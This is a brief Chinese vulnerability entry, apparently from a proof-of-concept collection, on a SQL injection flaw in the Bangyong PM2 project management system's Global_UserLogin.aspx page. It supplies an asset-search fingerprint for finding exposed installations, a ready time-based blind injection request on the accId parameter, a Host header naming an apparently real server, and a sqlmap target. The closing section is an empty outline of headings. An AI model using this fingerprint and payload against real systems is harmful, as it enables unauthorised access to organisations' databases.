# 邦永PM2项目管理系统Global_UserLogin.aspxSQL注入漏洞

- **系统**：邦永PM2项目管理系统Global_UserLogin.aspx　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="PM2项目管理系统BS版增强工具.zip"`
- **请求**：`GET /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **关键头**：`Host: pm2.sunwayopto.cn:8000`　`Content-Length: 0`

**请求体 / payload**
```

sqlmap
/Global/Global_UserLogin.aspx?accId=1
```

**其他**
- 邦永PM2项目管理系统Global\_UserLogin.aspx SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 邦永PM2项目管理系统